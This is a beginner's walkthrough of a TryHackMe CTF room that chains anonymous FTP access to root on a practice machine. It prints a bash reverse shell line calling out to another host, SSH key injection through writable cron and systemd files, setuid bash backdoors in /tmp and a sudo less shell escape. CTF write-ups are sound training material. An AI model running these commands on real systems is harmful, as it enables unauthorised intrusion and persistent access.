Jump Challenger: My Beginner-Friendly TryHackMe CTF Walkthrough
==============================================================
recon_user → dev_user → monitor_user → ops_user → root

scheduled script -> cron jobs -> scheduled service -> sudo -u ops_user script -> sudo root privilege
<img width="250" height="250" alt="jump" src="https://github.com/user-attachments/assets/01c89d85-fa51-420f-af08-a4097e3bc19c" />


**🔍 Reconnaissance and Enumeration**
-------------------------------------
- The first step in any CTF is information gathering. Started by scanning the target machine:
- Full port scan
```
nmap -sS -p- 10.48.129.45
```
<img width="488" height="176" alt="jump_1_nmap_port" src="https://github.com/user-attachments/assets/9edfdc3b-c25d-4d14-8290-6138ab712f4c" />

- Service fingerprinting
```
nmap -sS -sC -sV -p 21,22 10.48.129.45
```
<img width="494" height="313" alt="jump_1_nmap_service_enum" src="https://github.com/user-attachments/assets/6e8476b3-72bb-4058-a9a6-ed09dd8c8de6" />

- This revealed that FTP was open and allowed anonymous login.

**📂 Exploiting FTP**
----------------------
- After logging in anonymously, Uploaded a reverse shell script:
```
bash -i >& /dev/tcp/10.48.75.230/4444 0>&1
```
<img width="490" height="293" alt="jump_2_ftp_login_shell_upload" src="https://github.com/user-attachments/assets/4a354f10-6ad4-4968-9633-4e23020f6169" />

- On my system, Set up a listener using Penelope:
```
wget -q https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py && python3 penelope.py
```
- This gave us initial access as recon_user.

**🏴‍☠️ User Enumeration**
------------------------
- Once inside, I checked user details
```
id
whoami
ls -la
```
<img width="494" height="285" alt="jump_3_recon_user" src="https://github.com/user-attachments/assets/a47523a6-6559-471c-a878-f60caa303cdf" />

- recon_user flag found.
```
id
```
<img width="491" height="319" alt="jump_4_dev_user_flag" src="https://github.com/user-attachments/assets/2e27615e-029a-44fe-9237-ff06f385a805" />

- Output showed that recon_user was also part of the dev_user group. This allowed us to access the dev_user directory and capture the flag there.

**⬆️ Privilege Escalation to dev_user**
----------------------------------------
- To escalate privileges, Searched for files owned by dev_user:
1 . find cmd
```
find / -type f -user dev_user 2>/dev/null
```
<img width="491" height="133" alt="jump_4_dev_user_own_file" src="https://github.com/user-attachments/assets/2e755e77-9f3e-447c-8e84-c76b03cab244" />

2 . micro service enumeration tool pspy64
- [pspy](https://github.com/dominicbreuker/pspy): Monitor linux processes without root permissions · GitHub

<img width="485" height="131" alt="jump_4_dev_user_cron" src="https://github.com/user-attachments/assets/86527a60-2868-4b2c-952f-9c40f4364a6c" />

- Discovered /opt/dev/backup.sh. By editing this script and adding SSH key, gained access as dev_user.
- Attacker Machine:
```
ssh-keygen -t rsa -f dev-user -C jump
```
- copy the dev-user.pub to backup.sh
```
mkdir -p /home/dev_user/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCy1uujHjayWiifQB5bLz0wLKPNBUhxL9SL9yCKq+LO/U5+IH2VEhslVzTb0/U6GYjkiHF7O/rg0JW6cvGNB2ThXyXGSDVZuUDIvyptMqU1cd7qnIV+d5BIi1nJ8fGSv6UtzIP6O10OzHQe37eSpKFfsiG6r7RBjgXBxD+qlP9zkL7jb/Y2GJjQzdSKjWtS2QZKzMIzVwR0Kd7yZJbZL5UrNQobxBp5QJE/02MBAW3uh7qRst+U6ahnIELIii03uBNexaPfRiWlxKjmpwO4m6dXy4OtThDKFoXwFc8B/UDspPOQXBa8mkIWC88vPaNSmRkCWqNfow3GO0hwENVizM+9nPX+F9hrYiXMtpgM4v1kp+Roo0Pumq4OtoWwtA+x1AQcpYKKqAQH6weH255MadIL4KVTRtqFxIYGp1LNb3ZLD28KQaPzBBywQvNfsG/J2FnPHD61zJ08pRYQn6Ifp8dtG6ZfdDN85NHY3etvlwazlk0ZNx9RuW6Dhay51ioy9oc= jump" > /home/dev_user/.ssh/authorized_keys

chmod 700 /home/dev_user/.ssh
chmod 600 /home/dev_user/.ssh/authorized_keys

cp /bin/bash /tmp/devbash; chmod u+s /tmp/devbash
```
<img width="488" height="98" alt="jump_4_dev_user" src="https://github.com/user-attachments/assets/810ae2e0-6174-4f86-8b3c-dbc0993b0436" />

**📡 Moving to monitor_user**
-----------------------------
- Using pspy64, monitored processes and found a scheduled service running as monitor_user.

<img width="492" height="79" alt="jump_5_monitor_user_service" src="https://github.com/user-attachments/assets/96f743a4-c720-45a6-a0da-624404516a25" />

- navigate to /etc/systemd/system/healthcheck*

<img width="469" height="227" alt="jump_5_monitor_user_healthcheck" src="https://github.com/user-attachments/assets/e5be422e-c4cf-4ef4-b726-1f4a541893a2" />

- Although couldn't edit the ExecStart,

<img width="488" height="43" alt="jump_5_monitor_user_healthcheck_execstart" src="https://github.com/user-attachments/assets/e5d94cdd-59ba-4687-9e59-d5e6b19fd9f5" />

- Noticed the environment file was writable by dev_user.

<img width="431" height="54" alt="jump_5_monitor_user_healthcheck_environment" src="https://github.com/user-attachments/assets/0e621a1e-ef1c-4188-95ba-b4aa669e4824" />

- By injecting my SSH key there
- Attacker Machine:
```
ssh-keygen -t rsa -f monitor-user -C jump
copy monitor-user.pub key to /opt/dev/bin/ps
mkdir -p /home/monitor_user/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCaCLRAvqhrhZq/xLhY93qRmpdtrrDBmJZsdRKzASSjCmjJuaeM3RhOz0CBU5e0WEC7CJ2Fq0n4wCX8AOI6kAJu6T6HwTvo/m9e40wKuky8fD7p9sq4rXQvHtEdZ8FP+tkPItK8E8v85/+n9eO6u1uELhfPDfTcZEwkj5kevK8mMlAw1gVd4lSdVwGTDROSKPM+9oCTgQ1y+QzDdCHNxh6DlutzK+7EjyM0cOnMmo8FB5QCgAZHH1xgyh8YFJnKkQVKVPQPQNCsB1pzJ+VaaEJUdoGVqJ+0YoORybIfODnHx/PAzRQPiYMPO9G+zgwf4WmCfE6gyNy8gXsOXzOTIEuuVE98B0QjEs8zddNfJVewNeY6vUqo3KanxzbMziGx3lZOOBDRxQq74/S6jXjl+krn5Kzaqy6npkbdU5KGg8fli8XnQyGfadUulO33KEQRzbYyc/1/kBohdmf1hy7gIyx0EbEve+aY7vlwAlUlQn8P+4HNK0ot6aA8Y/ISBvtwLB0= jump" > /home/monitor_user/.ssh/authorized_keys

chmod 700 /home/monitor_user/.ssh
chmod 600 /home/monitor_user/.ssh/authorized_keys

cp /bin/bash /tmp/monitorbash; chmod u+s /tmp/monitorbash
```
- Assign execute permission to ps
```
chmod +x ps
```
- escalated to monitor_user.

<img width="499" height="131" alt="jump_5_monitor_user" src="https://github.com/user-attachments/assets/0fc258d2-630a-40d4-ac07-4383f41ed3e1" />

- monitor_user flag captured.
  
**⚙️ Escalating to ops_user**
------------------------------
- Checking sudo permissions (sudo -l)
```
sudo -l
```
<img width="496" height="140" alt="jump_5_ops_user_sudo" src="https://github.com/user-attachments/assets/ce45d1bb-223f-4865-9293-61f9d7e291ea" />

- Found deploy.sh linked to monitor_user.

<img width="500" height="237" alt="jump_5_ops_user_code" src="https://github.com/user-attachments/assets/a3f850b9-891c-476e-a172-8fd04cc67ea5" />

- Editing it with my SSH key allowed us to log in as ops_user.
```
ssh-keygen -t rsa -f ops-user -C jump
mkdir -p /home/ops_user/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7OXqLhxgzu5R9/KMJ7dLQh/suX+WqvsgLyecQS3MK+t5Rl0OIXC1KAdG1VAuTPbWLdWHz1fMBb9grOWN7/IG9UzKCb1jQ0bFhZT47F+DYfIwgzi4GXgp4muLXcStAvUgAufPngB62rdCjMJhlID9bTEP3Mx8qViL6eULTn2kh8QppfeHPHc+DfaONa0HipBhz9Op4YykHG9gB2I+NkVP60l9G4G4VRAQOxY5a4gkiIy/h/QOWREPOWeZr8GgqEVWdsxOdgRdOKDm7rM1YBtzWopJ6DsshUJdx53gHsH3E75IaFj5NStd7XKa6AsaLbRG71wdkcZMEDd7m/m8HDC5l3UMa4SZR6QxUQ6UqqSGJ7XnPmyhgMrpwIi8pYsDrqbZFGY4XJ8naQwCGKxY9I1/L6W6K2PTY/auK6gkvaz/fHjiJ+TnpG4aWMpQRYLZJLXO8pBR7MbVZukszKfGfXoZWsRYtQx1TIQR/ogMCxXRfI9RF03BDM5SMSrLuTiHD3VM= jump" > /home/ops_user/.ssh/authorized_keys

chmod 700 /home/ops_user/.ssh
chmod 600 /home/ops_user/.ssh/authorized_keys

cp /bin/bash /tmp/opsbash; chmod u+s /tmp/opsbash
```
- now, run sudo privilege against deploy.sh script
```
sudo -u ops_user /usr/local/bin/deploy.sh
```
<img width="485" height="83" alt="jump_5_ops_user_sudo_execute" src="https://github.com/user-attachments/assets/0df664ed-b070-4c49-bd81-b2fa2a84dc80" />

- finally ssh login as ops_user

<img width="490" height="123" alt="jump_5_ops_user" src="https://github.com/user-attachments/assets/b5d98f6e-2622-4350-9e06-5cae76f93e7d" />

- ops_user flag discoverd
  
**👑 Root Access**
-------------------
- Finally, with sudo -l, I discovered that less could be run with elevated privileges.

<img width="488" height="125" alt="jump_6_root_sudo_perm" src="https://github.com/user-attachments/assets/9cf7d90e-29aa-491d-b102-69ba601fce1d" />

- Using [GTFOBins](https://gtfobins.org/gtfobins/less/#shell), I spawned a shell:
```
sudo /usr/bin/less /etc/hosts
!/bin/sh
```
<img width="428" height="127" alt="jump_6_root" src="https://github.com/user-attachments/assets/90005790-c652-4344-a7ae-bf1570451ed1" />

- And just like that, Captured the root flag.



**📝 Key Takeaways**
--------------------
- Enumeration is everything: Always start with scanning and service fingerprinting.
- Group memberships matter: Users often belong to multiple groups, which can open new paths.
- Scheduled scripts are gold: Misconfigured cron jobs or services can be exploited.
- GTFOBins is your friend: Always check for sudo misconfigurations.
